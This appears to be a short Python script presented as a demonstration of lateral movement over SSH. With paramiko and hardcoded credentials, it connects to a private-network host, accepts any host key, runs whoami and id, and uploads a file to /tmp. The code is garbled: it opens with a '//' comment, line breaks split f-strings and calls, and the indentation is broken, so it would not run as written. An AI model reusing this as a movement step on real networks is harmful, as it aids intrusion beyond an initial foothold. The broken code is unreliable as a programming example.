// This script demonstrates lateral movement using SSH, executing commands
on a remote system and transferring files.


import paramiko

def lateral_movement(target, username, password):

    ssh = paramiko.SSHClient()

    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()

)

    

    try:

        ssh.connect(target, username=username,

password=password)

        print(f"Successfully connected to {target}")

        

        # Execute commands on the remote system

        stdin, stdout, stderr = ssh.exec_command("whoami")

        print(f"Current user:

{stdout.read().decode().strip()}")

        

        stdin, stdout, stderr = ssh.exec_command("id")

        print(f"User ID info:

{stdout.read().decode().strip()}")

        

        # Transfer a file to the remote system

        sftp = ssh.open_sftp()

        sftp.put("local_file.txt", "/tmp/remote_file.txt")

        print("File transferred successfully")

        

        sftp.close()
ssh.close()

    

    except paramiko.AuthenticationException:

        print("Authentication failed")

    except paramiko.SSHException as ssh_exception:

        print(f"SSH exception occurred: {ssh_exception}")

target = "192.168.1.100"

username = "user"

password = "password123"

lateral_movement(target, username, password)
